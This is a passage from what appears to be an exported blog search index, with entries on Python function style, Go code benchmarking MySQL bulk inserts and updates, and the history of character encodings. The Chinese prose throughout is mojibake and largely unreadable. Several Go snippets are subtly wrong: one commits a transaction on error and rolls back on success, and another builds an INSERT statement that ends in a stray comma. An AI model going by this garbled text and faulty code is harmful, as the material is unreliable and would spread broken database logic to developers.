ËøôÊ†∑ÂÅöÂèØ‰ª•ËÆ©ÂáΩÊï∞Áã¨Á´ã‰∫éÂÆÉÂ§ñÈÉ®ÁöÑ‰∏úË•ø„ÄÇÂèÇÊï∞ÂíåreturnËØ≠Âè•Â∞±ÊòØÈöîÁ¶ªÂ§ñÈÉ®‰æùËµñÁöÑÊúÄÂ•ΩÁöÑÂäûÊ≥ï„ÄÇ ÊÖéÁî®ÂÖ®Â±ÄÂèòÈáè, ÂÖ®Â±ÄÂèòÈáèÈÄöÂ∏∏ÊòØ‰∏ÄÁßçËπ©ËÑöÁöÑÂáΩÊï∞Èó¥ÁöÑËøõË°åÈÄö‰ø°ÁöÑÊñπÂºè„ÄÇÂÆÉ‰ºöÂºïÂèë‰æùËµñÂÖ≥Á≥ªÂíåËÆ°Êó∂ÁöÑÈóÆÈ¢òÔºå‰ªéËÄå‰ºöÂØºËá¥Á®ãÂ∫èË∞ÉËØïÂíå‰øÆÊîπÁöÑÂõ∞Èöæ„ÄÇËÄå‰∏î‰ªé‰ª£Á†ÅÂèäÊÄßËÉΩ‰ºòÂåñÊù•ËÄÉËôëÔºåÊú¨Âú∞ÂèòÈáèËøúÊØîÂÖ®Â±ÄÂèòÈáèÂø´„ÄÇ ÈÅøÂÖç‰øÆÊîπÂèØÂèòÁ±ªÂûãÁöÑÂèÇÊï∞ÔºàÊàñËÄÖÁõ¥Êé•ÈÅøÂÖç‰º†ÂÖ•ÂèØÂèòÁ±ªÂûãÁöÑÂèÇÊï∞ÔºåËÄå‰ΩøÁî®argsÔºå ÊàñËÄÖ*kwargs Êî∂ÈõÜÔºâPythonÊï∞ÊçÆÁ±ªÂûãÊØîÂ¶ÇËØ¥ÂàóË°®„ÄÅÂ≠óÂÖ∏Â±û‰∫éÂèØÂèòÂØπË±°„ÄÇÂú®‰Ωú‰∏∫ÂèÇÊï∞‰º†ÈÄíÁªôÂáΩÊï∞Êó∂ÔºåÊúâÊó∂‰ºöÂÉèÂÖ®Â±ÄÂèòÈáè‰∏ÄÊ†∑Ë¢´‰øÆÊîπ„ÄÇËøôÊ†∑ÂÅöÁöÑÂùèÂ§ÑÊòØÔºöÂ¢ûÂº∫‰∫ÜÂáΩÊï∞‰πãÈó¥ÁöÑËÄ¶ÂêàÊÄßÔºå‰ªéËÄåÂØºËá¥ÂáΩÊï∞Ëøá‰∫éÁâπÊÆäÂíå‰∏çÂèãÂ•Ω„ÄÇÁª¥Êä§Ëµ∑Êù•‰πüÂõ∞Èöæ„ÄÇËøô‰∏™Êó∂ÂÄôÂ∞±Ë¶ÅËÄÉËôë‰ΩøÁî®ÂàáÁâáS[:]ÂíåcopyÊ®°Âùó‰∏≠ÁöÑcopy()ÂáΩÊï∞Âíådeepcopy()ÂáΩÊï∞Êù•ÂÅö‰∏™Êã∑Ë¥ùÔºåÈÅøÂÖç‰øÆÊîπÂèØÂèòÂØπË±° ÂèÇËÄÉÊñáÊ°£ PEP8ÂÆòÊñπÊñáÊ°£ PEP8‰∏≠ÊñáÁøªËØë Google PythonÈ£éÊ†ºÊåáÂçó]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>pythonic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQLÊâπÈáèÊõ¥Êñ∞‰∏éÊèíÂÖ•]]></title>
    <url>%2F2017%2F06%2F19%2Fmysql-performance-for-bulk-action%2F</url>
    <content type="text"><![CDATA[ÊúÄËøë‰∏ÄÁõ¥‰ΩøÁî®gormÊù•Êìç‰ΩúÊï∞ÊçÆÂ∫ì, ‰ΩÜÂΩìÈÅáÂà∞‰∏Ä‰∫õÊâπÈáèÊìç‰ΩúÊó∂,ÊÑüËßâÊÄßËÉΩÂæàÂ∑Æ, ÂéüÂõ†ÂæàÁÆÄÂçï, gormÊòØ‰∏ÄÊù°‰∏ÄÊù°ÁöÑÊâßË°åÁöÑ,ÊïàÁéáÂæà‰Ωé, ÊâÄ‰ª•ÂØπ‰∫éÊâπÈáèÊìç‰Ωú, ÁâπÂà´ÊòØÂØπ‰∫éÂ§ßÈáèrecordÈúÄË¶ÅÂàõÂª∫ÊàñËÄÖ‰øÆÊîπÊó∂, Áõ¥Êé•‰ΩøÁî®SQL, ÊâçÊòØÊ≠£Á°ÆÁöÑÈÄâÊã©„ÄÇ Ë∞ÉÊï¥MySQLÈÖçÁΩÆ(MariaDB10) bulk_insert_buffer_size: Ë∞ÉÊï¥ÊâπÈáèÊèíÂÖ•ÁºìÂÜ≤Ôºå ÈªòËÆ§ÊòØ16M, ‰∏∫‰∫ÜËÉΩÊîØÊåÅÊõ¥Â§ßÊï∞ÊçÆÁöÑÊâπÈáèÊèíÂÖ•, ÊåâÈúÄË∞ÉÊï¥, ÊàëËøôÈáåË∞ÉÊï¥Âà∞128M net_buffer_length: ÂÆ¢Êà∑ÂèëÂá∫ÁöÑSQLËØ≠Âè•ÊúüÊúõÁöÑÈïøÂ∫¶, ÈªòËÆ§ÊòØ16K„ÄÇÂ¶ÇÊûúËØ≠Âè•Ë∂ÖËøáËøô‰∏™ÈïøÂ∫¶ÔºåÁºìÂÜ≤Âå∫Ëá™Âä®Âú∞Ë¢´Êâ©Â§ßÔºåÁõ¥Âà∞max_allowed_packet‰∏™Â≠óËäÇ, ÊàëË∞ÉÊï¥Âà∞128K max_allowed_packet: ‰∏Ä‰∏™ÂåÖÁöÑÊúÄÂ§ßÂ∞∫ÂØ∏, ÈªòËÆ§‰πüÊòØ16M„ÄÇÊ∂àÊÅØÁºìÂÜ≤Âå∫Ë¢´ÂàùÂßãÂåñ‰∏∫net_buffer_lengthÂ≠óËäÇÔºå‰ΩÜÊòØÂèØÂú®ÈúÄË¶ÅÊó∂Â¢ûÂä†Âà∞max_allowed_packet‰∏™Â≠óËäÇ, Êàë‰πüË∞ÉÊï¥Âà∞128M Â∞ÜËøô‰∫õÈÖçÁΩÆÂÜôÂÖ•MySQLÁöÑÈÖçÁΩÆÊñá‰ª∂‰∏≠123bulk_insert_buffer_size = 128Mnet_buffer_length = 128Kmax_allowed_packet = 128M ‰ªéÂêØMySQLÊü•ÁúãËøô‰∫õÂÖ®Â±ÄÂèòÈáèÊòØÂê¶ÁîüÊïà12345678910111213141516171819202122232425262728293031Welcome to the MariaDB monitor. Commands end with ; or \g.Your MariaDB connection id is 142Server version: 10.1.21-MariaDB-1~jessie mariadb.org binary distributionCopyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.MariaDB [(none)]&gt; show variables like "bulk_insert_buffer_size";+-------------------------+----------+| Variable_name | Value |+-------------------------+----------+| bulk_insert_buffer_size | 16777216 |+-------------------------+----------+1 row in set (0.00 sec)MariaDB [(none)]&gt; show variables like "net_buffer_length";+-------------------+-------+| Variable_name | Value |+-------------------+-------+| net_buffer_length | 16384 |+-------------------+-------+1 row in set (0.00 sec)MariaDB [(none)]&gt; show variables like "max_allowed_packet";+--------------------+----------+| Variable_name | Value |+--------------------+----------+| max_allowed_packet | 16777216 |+--------------------+----------+1 row in set (0.00 sec) ‰ΩøÁî®‰∫ãÂä°ÊâπÈáèÂàõÂª∫Âíå‰øÆÊîπÂ§öÊù°ËÆ∞ÂΩïÊó∂, Â¶ÇÊûú‰ΩøÁî®‰∫ÜÂ§öÊù°ËØ≠Âè•, ËØ∑‰∏ÄÂÆö‰ΩøÁî®‰∫ãÁâ©, Âõ†‰∏∫Ëøô‰∫õÂä®‰ΩúÊòØ‰∏Ä‰∏™‰∫ãÁâ©, ÈÅøÂÖçÈÉ®ÂàÜÊàêÂäü,ÈÉ®ÂàÜÂ§±Ë¥• ÈÄ†ÊàêÊï∞ÊçÆ‰∏ç‰∏ÄËá¥ÁöÑÈóÆÈ¢ò„ÄÇ12345678tx,_ := db.Begin() stm,_ := Tx.Preapare("insert into test values(?,null)") result,err := stm.Exec('123')if err != nil &#123; tx.Commit()&#125; else &#123; tx.Rollback()&#125; ÊâπÈáèÊèíÂÖ•ÊâπÈáèÊèíÂÖ•ÁöÑÊñπÊ≥ï‰∏ÄËà¨ÂåÖÂê´: Áõ¥Êé•Âæ™ÁéØÊèê‰æõ(ÈùûÂ∏∏‰∏çÊé®Ëçê) Âü∫‰∫é‰∫ãÁâ©ÁöÑÂæ™ÁéØÊèê‰∫§ Âà©Áî®INSERT INTOÁöÑÂ§öÂÄºÊèíÂÖ•ËØ≠Âè• ËøôÈáå‰ª•ÊèíÂÖ•10000Êù°Êï∞ÊçÆ‰∏∫‰æãËøõË°åÊµãËØï, ÂÖ≥‰∫é‰∏ãÈù¢ÁöÑÊµãËØï‰ª£Á†ÅËßÅ: ÊµãËØï‰ª£Á†ÅÂÆåÊï¥Á§∫‰æã Áõ¥Êé•Âæ™ÁéØÊèê‰∫§123456789101112131415// ‰ΩøÁî®ForÂæ™ÁéØÊâßË°åfunc forInsert() &#123; start := time.Now() stmt, err := db.Prepare(`INSERT user (user_name,user_age,user_sex) values (?,?,?)`) checkErr(err) for i := 0; i &lt; 10000; i++ &#123; name := "tony" + strconv.Itoa(i) _, err := stmt.Exec(name, i, 1) checkErr(err) &#125; delta := time.Now().Sub(start).String() fmt.Println("For Insert Total Time: ", delta)&#125; Âü∫‰∫é‰∫ãÁâ©Âæ™ÁéØÊèê‰∫§12345678910111213141516171819202122232425262728// Âú®‰∏Ä‰∏™‰∫ãÁâ©ÂÜÖÂæ™ÁéØÊâßË°åfunc withTxInsert() &#123; start := time.Now() tx, err := db.Begin() checkErr(err) stmt, err := tx.Prepare(`INSERT user (user_name,user_age,user_sex) values (?,?,?)`) checkErr(err) for i := 0; i &lt; 10000; i++ &#123; name := "tony" + strconv.Itoa(i) _, err := stmt.Exec(name, i, 1) checkErr(err) &#125; if err != nil &#123; err := tx.Rollback() checkErr(err) return &#125; err = tx.Commit() checkErr(err) delta := time.Now().Sub(start).String() fmt.Println("Bulk With Transaction Insert Total Time: ", delta)&#125; ÊûÑÈÄ†Êàê‰∏ÄÊù°ËØ≠Âè•Êèê‰∫§SQLÊ†∑‰æã: ‚ÄúINSERT INTO table (field1,field2,field3) VALUES (‚Äòa‚Äô,‚Äôb‚Äô,‚Äôc‚Äô), (‚Äòa‚Äô,‚Äôb‚Äô,‚Äôc‚Äô),(‚Äòa‚Äô,‚Äôb‚Äô,‚Äôc‚Äô);‚Äù12345678910111213141516171819202122232425262728// ÊûÑÈÄ†‰∏ÄÊù°InsertËØ≠Âè•ÊâπÈáèÊèê‰∫§func bulkoneInsert() &#123; start := time.Now() sql := "INSERT INTO `user` (`user_name`,`user_age`,`user_sex`) VALUES " for i := 0; i &lt; 10000; i++ &#123; name := "tony" + strconv.Itoa(i) if i &lt; 10000 &#123; sql += fmt.Sprintf("('%s','%d','%d'),", name, i, 1) &#125; else &#123; sql += fmt.Sprintf("('%s','%d','%d');", name, i, 1) &#125; &#125; // fmt.Println(sql) tx, err := db.Begin() checkErr(err) _, err = tx.Exec(sql) if err == nil &#123; tx.Commit() &#125; else &#123; fmt.Println(err) tx.Rollback() &#125; delta := time.Now().Sub(start).String() fmt.Println("Bulk One Insert Total Time: ", delta)&#125; ÊÄªÁªìÊúÄÂØπ3ÁßçÁä∂ÂÜµÁöÑÊèíÂÖ•Êó∂Èó¥ÊéíÂêç: Ranking Function Name Time 1 bulkoneInsert 283.548003ms 2 withTxInsert 4.047390845s 3 forInsert 1m55.580310398s ÁªìËÆ∫ÂæàÊòéÊòæ: ÊûÑÈÄ†‰∏ÄÊù°SQLÊèíÂÖ•ÊïàÁéáÈ´òÂæàÂ§ö ÊâπÈáèÊõ¥Êñ∞Êàë‰ª¨ÂèØ‰ª•‰ΩøÁî®Â§ö‰∏™UPDATEËØ≠Âè•ÊâπÈáèÊèê‰∫§, ÂêåÊó∂MySQL‰πüÊîØÊåÅ‰∏Ä‰∏™SQLËØ≠Âè•ÊâπÈáèÊõ¥Êñ∞Â§öÊù°ËÆ∞ÂΩï, Ê†áÂáÜÁöÑSQLÊòØ‰ΩøÁî®UPDATE WHENÊù•ÂÆûÁé∞, Èô§Ê≠§‰πãÂ§ñ ‰ªñÁöÑSQLÊâ©Â±ïËøòÊîØÊåÅINSERT INTO ÂíåREPLACE INTOÁî®‰∫érecordÁöÑÊâπÈáèÊõ¥Êñ∞, ‰ΩÜÊòØÊúÄÂ•ΩÂà´Áî®REPLACE INTO, Âõ†‰∏∫‰ªñÊòØÂÖàÂà†Èô§ÂÜçÊñ∞Â¢û, Âõ†Ê≠§Êú¨Ë¥®‰∏äÂÆÉ‰∏çÊòØÊõ¥Êñ∞Êìç‰Ωú, Âõ†‰∏∫Âà†Èô§Âêé, Êõ¥Êñ∞Êó∂Áº∫Â∞ëÊüê‰∫õÂ≠óÊÆµÁöÑËØù, ‰ºöÂØºËá¥Êï∞ÊçÆ‰∏¢Â§±, ËøôÂú®‰∏öÂä°‰∏äÊòØÁªùÂØπ‰∏çÂÖÅËÆ∏ÁöÑ, ËØ∑Ë∞®ÊÖé‰ΩøÁî® REPLACE INTO„ÄÇËÄåINSERT INTOÂàô‰∏ç‰ºöËøôÊ†∑„ÄÇ ÊúÄÂêé‰ΩøÁî®‰∏¥Êó∂Ë°®‰πüËÉΩËøõË°åÊâπÈáèÊõ¥Êñ∞(ÂÖàÊõ¥Êñ∞‰∏¥Êó∂Ë°®ÔºåÁÑ∂Âêé‰ªé‰∏¥Êó∂Ë°®‰∏≠update),ÊïàÁéá‰πüÁõ∏ÂΩì‰∏çÈîô,‰ΩÜÊòØÈúÄË¶ÅÁî®Êà∑ÊúâtemporaryË°®ÁöÑcreateÊùÉÈôê, Âõ†Ê≠§‰ΩøÁî®‰πüÂèóÈôê„ÄÇÊàë‰∏ÄËà¨‰ºö‰ΩøÁî®INSERT INTOÊù•ÊûÑÈÄ†ÊâπÈáèÊõ¥Êñ∞ÁöÑSQL, Âõ†‰∏∫ËØ•ËØ≠Ê≥ïÊñπ‰æøÊûÑÈÄ†, ‰∏ãÈù¢‰ºöÂØπÂêÑÁßçÊìç‰ΩúÂÅöÁÆÄÂçïÁöÑÊÄßËÉΩÂØπÊØî„ÄÇ ËøôÈáå‰ª•Êõ¥Êñ∞10000Êù°Êï∞ÊçÆ‰∏∫‰æãËøõË°åÊµãËØï(Âü∫‰∫é‰∏äÈù¢ÊèíÂÖ•ÁöÑÊï∞ÊçÆ), ÂÖ≥‰∫é‰∏ãÈù¢ÁöÑÊµãËØï‰ª£Á†ÅËßÅ: ÊµãËØï‰ª£Á†ÅÂÆåÊï¥Á§∫‰æã Âæ™ÁéØÊõ¥Êñ∞1234567891011121314151617181920212223242526272829// Âæ™ÁéØÊõ¥Êñ∞// UPDATE table SET column1=?,column2=? WHERE column=?func withTxUpdate() &#123; start := time.Now() tx, err := db.Begin() checkErr(err) stmt, err := tx.Prepare("UPDATE `user` SET `user_name`=? WHERE `user_id`=?;") checkErr(err) for i := 0; i &lt; 10000; i++ &#123; name := "forupdate" + strconv.Itoa(i) _, err := stmt.Exec(name, i+1) checkErr(err) &#125; if err != nil &#123; err := tx.Rollback() checkErr(err) return &#125; err = tx.Commit() checkErr(err) delta := time.Now().Sub(start).String() fmt.Println("Bulk With Transaction Update Total Time: ", delta)&#125; Ê†áÂáÜÁöÑUPDATEËØ≠Âè•ÊâπÈáèÊõ¥Êñ∞12345678910111213141516171819202122232425262728293031323334353637383940414243// Ê†áÂáÜUpdateËØ≠Âè•Êõ¥Êñ∞// UPDATE categories// SET dingdan = CASE id// WHEN 1 THEN 3// WHEN 2 THEN 4// WHEN 3 THEN 5// END,// title = CASE id// WHEN 1 THEN 'New Title 1'// WHEN 2 THEN 'New Title 2'// WHEN 3 THEN 'New Title 3'// END// WHERE id IN (1,2,3)func bulkStandardUpdate() &#123; start := time.Now() core := "" where := "" for i := 0; i &lt; 10000; i++ &#123; name := "standardupdate" + strconv.Itoa(i) core += fmt.Sprintf("WHEN '%d' THEN '%s' ", i+1, name) if i == 0 &#123; where += fmt.Sprintf("'%d'", i+1) &#125; else &#123; where += fmt.Sprintf(",'%d'", i+1) &#125; &#125; sql := fmt.Sprintf("UPDATE `user` SET `user_name`= CASE `user_id` %s END WHERE `user_id` IN (%s)", core, where) tx, err := db.Begin() checkErr(err) _, err = tx.Exec(sql) if err == nil &#123; tx.Commit() &#125; else &#123; fmt.Println(err) tx.Rollback() &#125; delta := time.Now().Sub(start).String() fmt.Println("Bulk Standard Update Total Time: ", delta)&#125; SQLÊâ©Â±ï(INSERT INTO ‚Ä¶ ON DUPLICATE KEY UPDATE)123456789101112131415161718192021222324252627282930// insert intoËØ≠Âè•Êõ¥Êñ∞// INSERT INTO test_tbl (id,dr) VALUES (1,'2'),(2,'3'),...(x,'y') ON DUPLICATE KEY UPDATE dr=values(dr);func bulkInsertIntoUpdate() &#123; start := time.Now() core := "" for i := 0; i &lt; 10000; i++ &#123; name := "insertintoupdate" + strconv.Itoa(i) if i == 0 &#123; core += fmt.Sprintf("('%d', '%s')", i+1, name) &#125; else &#123; core += fmt.Sprintf(",('%d', '%s')", i+1, name) &#125; &#125; sql := fmt.Sprintf("INSERT INTO `user` (`user_id`, `user_name`) VALUES %s ON DUPLICATE KEY UPDATE `user_name`=values(`user_name`);", core) tx, err := db.Begin() checkErr(err) _, err = tx.Exec(sql) if err == nil &#123; tx.Commit() &#125; else &#123; fmt.Println(err) tx.Rollback() &#125; delta := time.Now().Sub(start).String() fmt.Println("Bulk Insert Into Update Total Time: ", delta)&#125; SQLÊâ©Â±ï(REPLACE INTO)123456789101112131415161718192021222324252627282930// replace inotËØ≠Âè•Êõ¥Êñ∞// REPLACE INTO test_tbl (id,dr) VALUES (1,'2'),(2,'3'),...(x,'y');func bulkReplaceIntoUpdate() &#123; start := time.Now() core := "" for i := 0; i &lt; 10000; i++ &#123; name := "replaceintoupdate" + strconv.Itoa(i) if i == 0 &#123; core += fmt.Sprintf("('%d', '%s')", i+1, name) &#125; else &#123; core += fmt.Sprintf(",('%d', '%s')", i+1, name) &#125; &#125; sql := fmt.Sprintf("REPLACE INTO `user` (`user_id`, `user_name`) VALUES %s;", core) tx, err := db.Begin() checkErr(err) _, err = tx.Exec(sql) if err == nil &#123; tx.Commit() &#125; else &#123; fmt.Println(err) tx.Rollback() &#125; delta := time.Now().Sub(start).String() fmt.Println("Bulk Replace Into Update Total Time: ", delta)&#125; ÊÄªÁªìÊúÄÂØπ4ÁßçÁä∂ÂÜµÁöÑÊèíÂÖ•Êó∂Èó¥ÊéíÂêç: Ranking Function Name Time 1 bulkInsertIntoUpdate 462.575115ms 2 bulkReplaceIntoUpdate 564.974107ms 3 bulkStandardUpdate 3.160858907s 4 withTxUpdate 3.998437161s ÁªìËÆ∫ÂæàÊòéÊòæ: InsertIntoÊõ¥Êñ∞ÊïàÁéáÈ´òÂæàÂ§ö]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ÁºñÁ†ÅÁü•ËØÜ‰∏éÂ∏∏ËßÅ‰π±Á†ÅÈóÆÈ¢òÁöÑËß£ÂÜ≥ÂäûÊ≥ï]]></title>
    <url>%2F2017%2F05%2F14%2Funicode-war%2F</url>
    <content type="text"><![CDATA[Êúâ‰∏Ä‰∏™Âç≥‰ΩøÂú®ÁªèÈ™å‰∏∞ÂØåÁöÑÁ®ãÂ∫èÂëò‰∏≠‰πüÈùûÂ∏∏Â∏∏ËßÅÁöÑËØØËß£Â∞±ÊòØÔºåÁ∫ØÊñáÊú¨‰ΩøÁî®ASCIIÁ†ÅÂπ∂‰∏îÊØè‰∏™Â≠óÁ¨¶ÈÉΩÊòØ8bits„ÄÇ‰∫ãÂÆû‰∏äÂπ∂‰∏çÂ≠òÂú®ËøôÊ†∑ÁöÑÁ∫ØÊñáÊú¨ ÔºåÂ¶ÇÊûúÂú®ÂÜÖÂ≠òÊàñËÄÖÊòØÁ°¨Áõò‰∏äÈù¢Êúâ‰∏Ä‰∏™‰Ω†‰∏çÁü•ÈÅìÁºñÁ†ÅÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÈÇ£‰πà‰Ω†Â∞ÜÊó†Ê≥ïÁøªËØëÊàñËÄÖÊòæÁ§∫ÂÆÉ ÔºåËøôÁªùÂØπÊ≤°ÊúâÁ¨¨‰∫åÊù°Ë∑ØÂèØÈÄâ„ÄÇ Êï∞ÊçÆÁöÑÊú¨Ë¥®: ‰∫åËøõÂà∂CPUËÉΩËØÜÂà´ÁöÑÊï∞ÊçÆ: CPUÊòØÂà©Áî®Êï∞Â≠óÁîµË∑ØËÆæËÆ°Âá∫Êù•ÁöÑ,ÊâÄ‰ª•‰ªÖËÉΩËØÜÂà´‰∫åËøõÂà∂ÁöÑÊï∞ÊçÆ„ÄÇÁ£ÅÁõòËÉΩËØÜÂà´ÁöÑÊï∞ÊçÆÔºö Á£ÅÁõò‰∏äÊúâÂæàÂ§öÁ£ÅÊÄßÁöÑÁÇπÔºåËÄåËøô‰∫õÁÇπ Êúâ2ÁßçÁä∂ÊÄÅÔºåÊâÄ‰ª•‰ªª‰ΩïÊï∞ÊçÆ ‰ªÖËÉΩËΩ¨Êç¢Êàê2ËøõÁ®ã ÔºåÂèä01 ‰ª£Á†Å ÊâçËÉΩÂà©Áî®Á£ÅÁõòÁöÑÁÇπÁöÑËøôÁßçÁâπÊÄß Êù•ËøõË°åÂ≠òÂÇ® ÔºåÊâÄ‰ª•‰ªª‰ΩïÂ≠òÂÇ®Âú®Á£ÅÁõò‰∏äÁöÑÊï∞ÊçÆ ÈÉΩÊòØ‰∫åËøõÂà∂ÁΩëÁªú‰º†ËæìÁöÑÊï∞ÊçÆÔºöÈÄöËøáÁΩëÁªúËæìÂá∫ËøáÊù•ÁöÑÊï∞ÊçÆÔºå‰∏∫È´ò‰ΩéÁîµÈ¢ëÔºå‰πüÂØπÂ∫î‰∫åËøõÂà∂ ‰ΩÜÊòØ‰∏∫Âï•Êàë‰ª¨ÁúãÂà∞ÁöÑÊï∞ÊçÆÈÉΩ‰∏çÊòØ01‰ª£Á†ÅÂñÉ, ÊØîÂ¶ÇÊï∞ÊçÆÔºö ‰∏Ä‰∏≤‰∫åËøõÂà∂ÁöÑbitsÔºö0100100001000101010011000100110001001111 ‰∏∫Âï•ÊúÄÂêéÊàë‰ª¨Áî®ÊñáÊú¨Â∑•ÂÖ∑ÊâìÂºÄÂêé, ÁúãÂà∞ÁöÑÊòØHELLOËÄå‰∏çÊòØ01‰ª£Á†ÅÊú¨Ë∫´ÂñÉÔºüÈÇ£ÊñáÊú¨ÁºñËæëÂô®ÊòØÊÄé‰πàÂ∞Ü‰∫åËøõÂà∂ÁøªËØëÊàêÂ≠óÁ¨¶ÁöÑÂñÉÔºüËøôÈáåÊúâ2‰∏™ÂÖ≥ÈîÆÁöÑÈóÆÈ¢ò: Â≠óËäÇÊòØÊÄéÊ†∑ÂàÜÁªÑÁöÑÔºüÔºà‰æãÂ¶Ç1‰∏™Â≠óËäÇË°®Á§∫‰∏Ä‰∏™Â≠óÁ¨¶ËøòÊòØ2‰∏™Â≠óËäÇË°®Á§∫‰∏Ä‰∏™Â≠óÁ¨¶Ôºâ ‰∏Ä‰∏™ÊàñÂ§ö‰∏™Â≠óËäÇÊòØÊÄé‰πàÊò†Â∞ÑÂà∞Â≠óÁ¨¶‰∏äÁöÑ? ËøôÂ∞±ÊòØÊàë‰ª¨Ë¶ÅËØ¥ÁöÑÁºñÁ†ÅÈúÄË¶ÅËß£ÂÜ≥ÁöÑÈóÆÈ¢ò„ÄÇ ÁºñÁ†ÅÊ¶ÇÂøµÁºñÁ†ÅÁöÑÊ†∏ÂøÉÊòØÂÆö‰πâ‰∫ÜÂ¶Ç‰∏ã2‰ª∂‰∫ãÊÉÖ: Â≠óËäÇÊòØÊÄé‰πàÂàÜÁªÑÁöÑÔºåÂ¶Ç8 bitsÊàñ16 bits‰∏ÄÁªÑÔºåËøô‰πüË¢´Áß∞‰ΩúÁºñÁ†ÅÂçïÂÖÉ„ÄÇ ÁºñÁ†ÅÂçïÂÖÉÂíåÂ≠óÁ¨¶‰πãÈó¥ÁöÑÊò†Â∞ÑÂÖ≥Á≥ª„ÄÇ‰æãÂ¶ÇÔºåÂú®ASCIIÁ†Å‰∏≠ÔºåÂçÅËøõÂà∂65Êò†Â∞ÑÂà∞Â≠óÊØçA‰∏ä ÁºñÁ†Å‰πãÊàòÊ∑∑ÊàòÂπ¥‰ª£Âæà‰πÖ‰ª•ÂâçÔºåËÆ°ÁÆóÊú∫Âà∂ÈÄ†ÂïÜÊúâËá™Â∑±ÁöÑË°®Á§∫Â≠óÁ¨¶ÁöÑÊñπÂºè„ÄÇ‰ªñ‰ª¨Âπ∂‰∏çÈúÄË¶ÅÊãÖÂøÉÂ¶Ç‰ΩïÂíåÂÖ∂ÂÆÉËÆ°ÁÆóÊú∫‰∫§ÊµÅÔºåÂπ∂ÊèêÂá∫‰∫ÜÂêÑËá™ÁöÑÊñπÂºèÊù•Â∞ÜÂ≠óÂΩ¢Ê∏≤ÊüìÂà∞Â±èÂπï‰∏ä„ÄÇÈöèÁùÄËÆ°ÁÆóÊú∫Ë∂äÊù•Ë∂äÊµÅË°åÔºåÂéÇÂïÜ‰πãÈó¥ÁöÑÁ´û‰∫âÊõ¥Âä†ÊøÄÁÉàÔºåÂú®‰∏çÂêåÁöÑËÆ°ÁÆóÊú∫‰ΩìÁ≥ªÈó¥ËΩ¨Êç¢Êï∞ÊçÆÂèòÂæóÂçÅÂàÜËõãÁñºÔºå‰∫∫‰ª¨ÂéåÁÉ¶‰∫ÜËøôÁßçËá™ÂÆö‰πâÈÄ†ÊàêÁöÑÊ∑∑‰π±„ÄÇ ASCIIÁ†ÅÁöÑÂà∞Êù•ÊúÄÁªàÔºåËÆ°ÁÆóÊú∫Âà∂ÈÄ†ÂïÜ‰∏ÄËµ∑Âà∂ÂÆö‰∫Ü‰∏Ä‰∏™Ê†áÂáÜÁöÑÊñπÊ≥ïÊù•ÊèèËø∞Â≠óÁ¨¶„ÄÇ‰ªñ‰ª¨ÂÆö‰πâ‰ΩøÁî®‰∏Ä‰∏™Â≠óËäÇÁöÑ‰Ωé7‰ΩçÊù•Ë°®Á§∫Â≠óÁ¨¶ÔºåÂπ∂‰∏îÂà∂‰Ωú‰∫ÜÂ¶Ç‰∏äÂõæÊâÄÁ§∫ÁöÑÂØπÁÖßË°®Êù•Êò†Â∞Ñ‰∏É‰∏™ÊØîÁâπÁöÑÂÄºÂà∞‰∏Ä‰∏™Â≠óÁ¨¶‰∏ä„ÄÇ‰æãÂ¶ÇÔºåÂ≠óÊØçAÊòØ65ÔºåcÊòØ99Ôºå~ÊòØ126Á≠âÁ≠âÔºå ASCIIÁ†ÅÂ∞±ËøôÊ†∑ËØûÁîü‰∫Ü„ÄÇÂéüÂßãÁöÑASCIIÊ†áÂáÜÂÆö‰πâ‰∫Ü‰ªé0Âà∞127 ÁöÑÂ≠óÁ¨¶ÔºåËøôÊ†∑Ê≠£Â•ΩËÉΩÁî®‰∏É‰∏™ÊØîÁâπË°®Á§∫„ÄÇ‰∏çËøáÂ•ΩÊôØ‰∏çÈïø„ÄÇ„ÄÇ„ÄÇ ASCIIÁ†ÅÁ¨¨ÂÖ´‰Ωç ÂºïËµ∑ÁöÑÊàò‰∫â‰∏∫‰ªÄ‰πàÈÄâÊã©‰∫Ü7‰∏™ÊØîÁâπËÄå‰∏çÊòØ8‰∏™Êù•Ë°®Á§∫‰∏Ä‰∏™Â≠óÁ¨¶Âë¢ÔºüÊàëÂπ∂‰∏çÂÖ≥ÂøÉ„ÄÇ‰ΩÜÊòØ‰∏Ä‰∏™Â≠óËäÇÊòØ8‰∏™ÊØîÁâπÔºåËøôÊÑèÂë≥ÁùÄ1‰∏™ÊØîÁâπÂπ∂Ê≤°ÊúâË¢´‰ΩøÁî®Ôºå‰πüÂ∞±ÊòØ‰ªé128Âà∞255ÁöÑÁºñÁ†ÅÂπ∂Ê≤°ÊúâË¢´Âà∂ÂÆöASCIIÊ†áÂáÜÁöÑ‰∫∫ÊâÄËßÑÂÆöÔºåËøô‰∫õÁæéÂõΩ‰∫∫ÂØπ‰∏ñÁïåÁöÑÂÖ∂ÂÆÉÂú∞Êñπ‰∏ÄÊó†ÊâÄÁü•ÁîöËá≥ÂÆåÂÖ®‰∏çÂÖ≥ÂøÉ„ÄÇÂÖ∂ÂÆÉÂõΩÂÆ∂ÁöÑ‰∫∫Ë∂ÅËøô‰∏™Êú∫‰ºöÂºÄÂßã‰ΩøÁî®128Âà∞255ËåÉÂõ¥ÂÜÖÁöÑÁºñÁ†ÅÊù•Ë°®ËææËá™Â∑±ËØ≠Ë®Ä‰∏≠ÁöÑÂ≠óÁ¨¶„ÄÇ‰æãÂ¶ÇÔºå144Âú®ÈòøÊãâ‰ºØ‰∫∫ÁöÑASCIIÁ†Å‰∏≠ÊòØ⁄ØÔºåËÄåÂú®‰øÑÁΩóÊñØÁöÑASCIIÁ†Å‰∏≠ÊòØ—í„ÄÇÂç≥‰ΩøÂú®ÁæéÂõΩÔºåÂØπ‰∫éÊú™‰ΩøÁî®Âå∫Âüü‰πüÊúâÂêÑÁßçÂêÑÊ†∑ÁöÑÂà©Áî®„ÄÇIBM PCÂ∞±Âá∫Áé∞‰∫Ü‚ÄúOEM 